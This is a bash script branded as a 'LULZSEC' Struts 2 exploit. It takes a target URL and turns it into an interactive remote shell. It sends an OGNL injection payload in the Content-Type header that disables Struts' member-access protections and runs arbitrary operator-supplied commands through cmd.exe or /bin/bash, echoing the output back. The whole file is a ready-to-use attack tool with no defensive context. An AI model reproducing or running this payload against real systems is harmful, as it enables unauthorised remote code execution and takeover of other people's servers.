#!/bin/bash 

clear

NC='\033[0m'          
Black='\033[0;30m'       
Red='\033[0;31m'         
Green='\033[1;32m'       
Yellow='\033[1;33m'      
Blue='\033[0;34m'     
Purple='\033[0;35m'       
Cyan='\033[1;36m'      
White='\033[0;37m'    
BGreen='\033[1;32m'     
BRed='\033[1;31m'


echo -e "${Cyan}+-------------------------------------------------------------------+${NC}"
echo -e "${Cyan}|${NC}                      ${BGreen}[${NC}${BRed}LULZSEC STUTS-2 EXPLOIT${NC}${BGreen}]${NC}                    ${Cyan}|${NC}"
echo -e "${Cyan}|${NC}                                                                   ${Cyan}|${NC}"
echo -e "${Cyan}|${NC}                                            | ${NC}${Yellow}Coder:${NC}${BGreen} Suvadip Kar${NC}${NC} | ${NC}${Cyan}|${NC}"
echo -e "${Cyan}|${NC}${BRed}USAGE:-${NC} explx.sh ${BGreen}http://site.com/log.action${NC} | ${Yellow}Version:${NC} ${BGreen}1.0${NC}       | ${Cyan}|${NC}"
echo -e "${Cyan}+-${NC}${Green}[       -CMD-       ]${Cyan}---------------------------------------------${Cyan}+${NC}"
if [[ -z "$1" ]]; then                               
	
	exit
fi
while read -p "[>>>]" cmd; do 
	m=`curl -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\"$cmd\").(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" "$1" -s`
	if [[ -z "$m" ]]; then
		echo -e "No response received \n Make sure the site is vulnerable"
	else echo "$m"
	fi
done
